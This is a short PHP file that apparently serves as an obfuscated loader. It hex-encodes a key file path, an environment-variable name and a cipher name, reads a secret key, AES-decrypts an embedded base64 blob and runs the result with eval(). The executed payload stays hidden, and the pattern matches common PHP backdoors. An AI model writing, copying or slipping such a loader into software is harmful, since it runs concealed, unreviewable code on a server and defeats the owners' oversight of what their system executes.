<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TrUc7DZTy7jSNCujiKXmNg==');

$c=base64_decode(

'1sLDQfDE/r9JYQRZtuMN9We1VkowV0theRldRXPlLFf+R1l3WA5X61DoPRSAtIXR6JC08cc9ivbB' .
'OFOnfWnoffIT2lZ0Rbi9WeanEsIQNj9casfTgytxzgBWk/uqR+luu+rVuEYnOW+tl6I/ciuRFHuW' .
'uRvNGasyhkol6ZsooBRw3q0JkxUeeyusQejtBnGKvLUv9bkfzQ1suQNFpWY6u05E+NwpncTHTQ5F' .
'CWaidVw5LWfpi3BFBtdbFyB2Clhd1fdflgZ0rUbPJ/grscqQ5NTo0UUNWoxNxwHDIjB5T9UzBBw9' .
'rl4fB8xxNGqLdyJzUBHdKI38uBnFtoZljoQRVfhBzsuNeIiHaZX9HPDngBs/gg7j+GEkRUGS4HhX' .
'RqFBglH6+766m9zWVvIYxSSAak09weeuDhQQehqwcKiooIiUrtHVwJFcj2thsJ4UZyRqxhGVwQwR' .
'Ot9/1DLZVMhHizGoP3xNWfqj/7ZY0OzGepL6nUohx/5PiEfUvKp5DBUk1Y9okpHoZ7ozAhTDn/EW' .
'xTlFJjXU7IQwYihTD7IFdkg='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

